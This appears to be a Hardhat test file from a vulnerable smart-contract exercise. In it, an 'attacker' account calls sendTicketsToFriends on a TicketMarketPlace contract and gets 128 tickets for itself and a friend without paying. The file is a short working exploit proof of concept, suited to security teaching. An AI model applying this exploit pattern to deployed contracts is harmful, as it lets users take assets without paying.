const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("VulnContract-001", function () {

  before(async function () {

    [deployer, user, attacker] = await ethers.getSigners();

    const vulnContractFactory = await ethers.getContractFactory(
      'contracts/TicketMarketPlace.sol:TicketMarketPlace',
      deployer,
    )

    this.vulnContract = await vulnContractFactory.deploy() 

  })

  it("Test", async function () {

    //Deployer put on sale some tickets
    await this.vulnContract.setPriceAndStock(1, 5, 100)

    //Get tickets for free
    const friends = [attacker.address, user.address]
    await this.vulnContract.connect(attacker).sendTicketsToFriends(friends, 1, 128)

    //Check balance
    const attackerBalance = await this.vulnContract.connect(attacker).getBalance(1)
    const userBalance = await this.vulnContract.connect(user).getBalance(1)
    expect(attackerBalance.toString()).to.eq("128")
    expect(userBalance.toString()).to.eq("128")
  })
  
});
